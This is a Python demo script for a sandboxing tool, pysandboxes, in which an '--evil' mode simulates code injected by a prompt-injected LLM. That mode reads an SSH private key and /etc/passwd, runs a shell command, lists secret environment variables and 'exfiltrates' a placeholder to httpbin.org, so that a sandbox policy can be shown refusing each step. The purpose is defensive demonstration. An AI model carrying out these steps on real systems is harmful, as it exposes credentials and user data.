# Copyright (c) 2026, Carbon-It, Philippe Prados (pprados)
# License: Apache V2
"""A tiny application for a live pysandboxes demo: one URL, one directory, one API key.

Learn its policy once with `python-sb --learn app/demo.py`, then run it in another context
(another URL, another directory, or `--evil`) and watch the policy refuse what was never learned.
"""

import argparse
import os
import re
import urllib.request
from collections.abc import Callable
from pathlib import Path


def step(title: str, action: Callable[[], str]) -> None:
    """Run one action and print its result, or the reason it was refused."""
    try:
        print(f"[ OK ]    {title}: {action()}")
    except Exception as e:  # noqa: BLE001 the demo shows every refusal and goes on
        print(f"[REFUSED] {title}: {type(e).__name__}: {e}")


def fetch_title(url: str) -> str:
    with urllib.request.urlopen(url, timeout=10) as response:
        match = re.search(r"<title>(.*?)</title>", response.read().decode(errors="replace"), re.S)
        return f"HTTP {response.status}, title={match.group(1).strip() if match else '?'}"


def read_directory(directory: Path) -> str:
    return ", ".join(f"{f.name}={f.read_text().strip()!r}" for f in sorted(directory.iterdir()) if f.is_file())


def evil() -> None:
    """What a prompt-injected or hallucinating LLM could slip into the same application."""
    step("read an SSH key", lambda: (Path.home() / ".ssh" / "id_rsa").read_text()[:30])
    step("read /etc/passwd", lambda: Path("/etc/passwd").read_text().splitlines()[0])
    step("run a shell command", lambda: f"exit code {os.system('id')}")
    step("list secrets in the environment", lambda: ", ".join(k for k in os.environ if "KEY" in k or "SECRET" in k))
    step("exfiltrate", lambda: fetch_title("https://httpbin.org/anything?secret=stolen"))


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--url", default="https://example.com", help="URL to fetch (default: %(default)s)")
    parser.add_argument(
        "--dir", default="data", type=Path, help="directory whose files are read (default: %(default)s)"
    )
    parser.add_argument(
        "--evil",
        action="store_true",
        help="then simulate injected code: read an SSH key and /etc/passwd, run a shell command, "
        "list the secrets in the environment and send data out",
    )
    parser.epilog = "Reads $DEMO_API_KEY from the environment and prints its first three characters."
    args = parser.parse_args()

    step(f"GET {args.url}", lambda: fetch_title(args.url))
    step(f"read {args.dir}/", lambda: read_directory(args.dir))
    step("read $DEMO_API_KEY", lambda: f"{os.environ['DEMO_API_KEY'][:3]}...")
    if args.evil:
        evil()


if __name__ == "__main__":
    main()
